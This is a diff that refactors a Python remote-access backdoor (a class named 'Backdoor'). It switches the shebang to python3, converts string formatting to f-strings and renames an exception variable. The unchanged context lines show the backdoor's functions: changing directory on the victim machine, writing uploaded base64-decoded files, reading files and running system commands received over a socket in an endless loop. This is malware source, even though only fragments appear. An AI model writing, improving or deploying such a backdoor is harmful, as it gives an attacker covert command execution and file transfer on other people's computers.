@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 import socket
 import subprocess
@@ -63,12 +63,12 @@ class Backdoor:
 
     def change_working_dir(self, path):
         os.chdir(path)
-        return "[+] Navigating to directory {i}".format(i=path)
+        return f"[+] Navigating to directory {path}"
 
     def write_file(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content)) # encapsulate all unknown chars
-            return "[+] Successfully uploaded file {i} from host.".format(i=path)
+            return f"[+] Successfully uploaded file {path} from host." 
     
     def read_file(self, path):
         with open(path, "rb") as file:
@@ -89,8 +89,8 @@ class Backdoor:
                     cmd_res = self.write_file(cmd[1], cmd[2])
                 else:
                     cmd_res = self.execute_system_cmd(cmd)
-            except Exception as i:
-                cmd_res = "[-] An error occurred during command execution. see {i}".format(i=i)
+            except Exception as stderr:
+                cmd_res = f"[-] An error occurred during command execution. see {stderr}"
             self.serialize(cmd_res)
 
 while True:
